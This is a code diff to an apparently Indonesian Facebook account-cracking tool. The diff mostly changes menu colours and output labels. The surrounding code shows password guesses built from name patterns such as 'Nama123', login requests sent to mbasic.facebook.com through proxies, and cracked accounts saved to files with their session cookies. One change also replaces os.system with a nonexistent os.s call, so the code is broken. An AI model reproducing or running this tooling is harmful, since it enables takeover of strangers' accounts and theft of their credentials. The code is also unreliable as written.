@@ -1209,10 +1209,10 @@ def setting():
 		print(' [+] SALAH COYY ')
 		exit()
 	urut = []
-	urut.append(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Login Site ValidateV1 [bold green]Recommended[bold white] [/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Login Site MbasicV1 [bold green]Very Recommend[bold white] [/]\n[bold white][[bold cyan]03[/][bold white]][/] [bold white]Login Site FreeV1 [bold green]Recommend[bold white] ',width=45,title=f"[bold green]Metode",style=f"bold white"))
-	urut.append(panel(f'[bold white][[bold cyan]04[/][bold white]][/] [bold white]Login Site RegulerV1 [bold green]Recommend[bold white] [/]\n[bold white][[bold cyan]05[/][bold white]][/] [bold white]Login Site MbasicV2 [bold green]Very Recommend[bold white] [/]\n[bold white][[bold cyan]06[/][bold white]][/] [bold white]Login SiteV2 [bold green]Recommend[bold white] ',width=45,title=f"[bold green]Metode",style=f"bold white"))
-	urut.append(panel(f'[bold white][[bold cyan]07[/][bold white]][/] [bold white]Login Site Async [bold green]Recommend[bold white]  ',width=45,title=f"[bold green]Metode",style=f"bold white"))
-	urut.append(panel(f'[bold white][[bold cyan]08[/][bold white]][/] [bold white]Login Site B-Api [bold green]Recommend[bold white]  ',width=45,title=f"[bold green]Metode",style=f"bold white"))
+	urut.append(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Login Site ValidateV1 [bold green]Recommended[bold white] [/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Login Site MbasicV1 [bold green]Very Recommend[bold white] [/]\n[bold white][[bold green]03[/][bold white]][/] [bold white]Login Site FreeV1 [bold green]Recommend[bold white] ',width=45,title=f"[bold green]Metode",style=f"bold white"))
+	urut.append(panel(f'[bold white][[bold green]04[/][bold white]][/] [bold white]Login Site RegulerV1 [bold green]Recommend[bold white] [/]\n[bold white][[bold green]05[/][bold white]][/] [bold white]Login Site MbasicV2 [bold green]Very Recommend[bold white] [/]\n[bold white][[bold green]06[/][bold white]][/] [bold white]Login SiteV2 [bold green]Recommend[bold white] ',width=45,title=f"[bold green]Metode",style=f"bold white"))
+	urut.append(panel(f'[bold white][[bold green]07[/][bold white]][/] [bold white]Login Site Async [bold green]Recommend[bold white]  ',width=45,title=f"[bold green]Metode",style=f"bold white"))
+	urut.append(panel(f'[bold white][[bold green]08[/][bold white]][/] [bold white]Login Site B-Api [bold green]Recommend[bold white]  ',width=45,title=f"[bold green]Metode",style=f"bold white"))
 	console.print(Columns(urut))
 	hc = input(f' [+] Pilih Metode : ')
 	if hc in ['1','01']:
@@ -1233,9 +1233,9 @@ def setting():
 	    method.append('bapi')
 	else:
 		method.append('validate1')
-	cetak(panel('''[bold white][[bold cyan]01[bold white]] [bold white]Nama, Nama123, Nama1234 [[bold green]Recommended[bold white]]
-[bold white][[bold cyan]02[bold white]] [bold white]Nama, Nama123, Nama1234, Nama12345 [[bold green]Very Recommended[bold white]]
-[bold white][[bold cyan]03[bold white]] [bold white]Nama, Nama123, Nama1234, Nama12345 + Manual [[bold red]Not Recommended[bold white]]''',style='bold white',title='[bold green]Setting Password',width=90))
+	cetak(panel('''[bold white][[bold green]01[bold white]] [bold white]Nama, Nama123, Nama1234 [[bold green]Recommended[bold white]]
+[bold white][[bold green]02[bold white]] [bold white]Nama, Nama123, Nama1234, Nama12345 [[bold green]Very Recommended[bold white]]
+[bold white][[bold green]03[bold white]] [bold white]Nama, Nama123, Nama1234, Nama12345 + Manual [[bold red]Not Recommended[bold white]]''',style='bold white',title='[bold green]Setting Password',width=90))
 	pwplus=input(f' [+] {P}Pilih Sandi : ')
 	if pwplus in ['03','3']:
 		pwpluss.append('ya')
@@ -1577,8 +1577,8 @@ def reguler2(idf,pwv):
 			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				tree = Tree(f" ")
-				tree.add(f"[bold yellow]{idf}|{pw}")
-				tree.add(f"[bold yellow]{ua}\n")
+				tree.add(f"[bold yellow][CP]>{idf}|{pw}")
+				tree.add(f"[bold yellow][CP]>{ua}\n")
 				cetak(tree)
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
@@ -1589,8 +1589,8 @@ def reguler2(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				tree = Tree(f"  ")
-				tree.add(f"[bold green]{idf}|{pw}")
-				tree.add(f"[bold green]{kuki}\n")
+				tree.add(f"[bold green][CP]>{idf}|{pw}")
+				tree.add(f"[bold green][CP]>{kuki}\n")
 				cetak(tree) 
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
 				cek_apk(session,coki)
@@ -2156,6 +2156,6 @@ if __name__=='__main__':
 	except:pass
 	try:os.system('touch .prox.txt')
 	except:pass
-	try:os.system('clear')
+	try:os.s('clear')
 	except:pass
 	login()
